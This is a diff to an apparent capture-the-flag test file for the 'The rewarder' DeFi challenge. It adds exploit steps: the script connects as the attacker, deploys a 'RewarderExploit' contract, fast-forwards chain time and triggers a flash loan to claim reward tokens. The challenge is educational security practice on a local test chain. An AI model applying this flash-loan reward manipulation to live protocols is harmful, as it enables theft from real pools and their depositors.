@@ -66,6 +66,29 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // connect as the attacker;
+        this.rewarderPool = await this.rewarderPool.connect(attacker);
+        this.rewardToken = await this.rewardToken.connect(attacker);
+        this.accountingToken = await this.accountingToken.connect(attacker);
+        this.liquidityToken = await this.liquidityToken.connect(attacker);
+        this.flashLoanPool = await this.flashLoanPool.connect(attacker);
+
+        // liquidityTokens can be borrowed through flashLoanPool
+
+        console.log("BEFORE " );
+        console.log(await this.rewarderPool.roundNumber());
+        console.log(await this.rewarderPool.lastSnapshotIdForRewards());
+        console.log(await this.rewarderPool.lastRecordedSnapshotTimestamp());
+
+        const exploitFactory = await ethers.getContractFactory("RewarderExploit", attacker);
+        const exploit = await exploitFactory.deploy(this.flashLoanPool.address, this.rewarderPool.address);
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await exploit.triggerLoan(TOKENS_IN_LENDER_POOL);
+
+        const attackerRewardTokens = await this.rewardToken.balanceOf(attacker.address);
+        console.log("ATTACKER'S BALANCE " + attackerRewardTokens);
     });
 
     after(async function () {
